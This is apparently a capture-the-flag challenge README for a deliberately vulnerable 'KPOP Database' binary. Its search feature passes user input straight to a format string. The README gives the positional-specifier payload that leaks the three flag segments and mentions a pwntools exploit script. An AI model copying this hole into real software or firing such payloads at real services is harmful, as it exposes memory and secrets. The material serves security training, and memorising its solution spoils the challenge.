### KPOP Database – Format String (Difficulty 7/10)

#### Overview
- Binary reads `flag.txt` into memory and splits it into 3 segments: `g_seg1`, `g_seg2`, `g_seg3`.
- Search feature prints user-controlled input as a format string and passes many varargs. The 3 flag segments are placed at sparse positions to require positional specifiers:
  - `%4$s` -> `g_seg2`
  - `%7$s` -> `g_seg1`
  - `%9$s` -> `g_seg3`
- A naive `%s %s` won’t reveal the entire flag; you must use positional parameters.

#### Local build and run
```bash
cd src
make
make run
```

#### Local net service
```bash
cd src
make serve
# in another terminal
nc 127.0.0.1 9001
```

#### Exploitation (manual)
Use positional specifiers to reconstruct the flag:
```
2               # Search
%7$s%4$s%9$s    # seg1 + seg2 + seg3
```
You can also separate with markers for easier parsing:
```
%7$s||%4$s||%9$s
```

#### Pwntools exploit
```bash
python3 -m pip install -r requirements.txt
python3 exploit.py proc
python3 exploit.py local
python3 exploit.py remote --host HOST --port PORT
```
The exploit sends `%7$s||%4$s||%9$s`, splits on `||`, then concatenates.

#### Docker service
```bash
# From repository root
docker compose up --build -d
nc 127.0.0.1 9001
```

#### Notes for organizers
- Mitigations relaxed in container; macOS build uses `-no_pie` flag (ignored on arm64).
- Provide a deployment-time `flag.txt`.
- Timeout: `alarm(120)`.
